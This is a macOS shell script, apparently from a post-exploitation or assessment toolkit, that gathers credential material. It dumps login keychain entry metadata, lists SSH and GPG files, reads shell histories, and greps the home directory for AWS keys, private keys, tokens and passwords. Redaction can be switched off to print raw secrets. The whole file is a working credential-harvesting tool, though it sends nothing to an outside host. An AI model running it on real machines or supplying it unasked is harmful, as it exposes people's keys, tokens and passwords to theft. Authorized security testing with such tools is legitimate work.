#!/bin/sh
# gather/macos/enum-credentials.sh — Enumerate macOS credential-bearing artifacts
# Requires: Current user context (some paths need admin/root)
# Read-only: YES
# Sensitive-output: YES — redacted by default; set BRJOTSKEL_REVEAL_SECRETS=1 to print raw material
# Purpose: Locate Keychain, cloud, SSH, shell history, and application credential material.
set -u

REVEAL_SECRETS="${BRJOTSKEL_REVEAL_SECRETS:-0}"
sec(){ printf '\n=== %s ===\n' "$1"; }
run(){ printf '$ %s\n' "$*"; sh -c "$*" 2>/dev/null || true; }
run_secret(){ printf '$ %s\n' "$*"; sh -c "$*" 2>/dev/null | redact_stream || true; }
redact_stream() {
  if [ "$REVEAL_SECRETS" = "1" ]; then
    cat
  else
    sed -E \
      -e 's/(aws_secret_access_key[[:space:]]*=[[:space:]]*)[^[:space:]]+/\1<redacted>/g' \
      -e 's/(token[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/g' \
      -e 's/(secret[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/g' \
      -e 's/(password[[:space:]]*[=:][[:space:]]*)[^[:space:]",]+/\1<redacted>/g' \
      -e 's#(https?://[^:/]+:)[^@]+@#\1<redacted>@#g' \
      -e 's/-----BEGIN [^-]*PRIVATE KEY-----/<private key block redacted; set BRJOTSKEL_REVEAL_SECRETS=1>/g' \
      -e 's/-----END [^-]*PRIVATE KEY-----/<private key block redacted end>/g'
  fi
}

sec CREDENTIAL_COLLECTION_MODE
printf 'Secret output: %s\n' "$([ "$REVEAL_SECRETS" = "1" ] && echo 'REVEAL enabled' || echo 'REDACTED; set BRJOTSKEL_REVEAL_SECRETS=1 to reveal raw values')"

sec CURRENT_USER
run 'whoami'
run 'security list-keychains 2>/dev/null'
run 'security default-keychain 2>/dev/null'
run 'security dump-keychain -d login.keychain-db 2>/dev/null | egrep "acct|desc|srvr|svce"'

sec SSH_AND_GPG
run 'find ~/.ssh -maxdepth 2 -type f 2>/dev/null -exec ls -la {} \;'
run 'find ~/.gnupg -maxdepth 2 -type f 2>/dev/null -exec ls -la {} \;'
run_secret 'cat ~/.ssh/authorized_keys ~/.ssh/known_hosts 2>/dev/null'

sec HISTORIES_AND_TOKENS
run_secret 'tail -100 ~/.zsh_history 2>/dev/null'
run_secret 'tail -100 ~/.bash_history 2>/dev/null'
run_secret 'grep -R -nE "(AKIA|aws_access_key_id|aws_secret_access_key|BEGIN [A-Z ]*PRIVATE KEY|token|password=)" ~/.aws ~/.config ~/.ssh ~/.kube ~ 2>/dev/null | head -200'

sec AUTOLOGIN_AND_FILEVAULT
run 'defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser 2>/dev/null'
run 'fdesetup list 2>/dev/null'
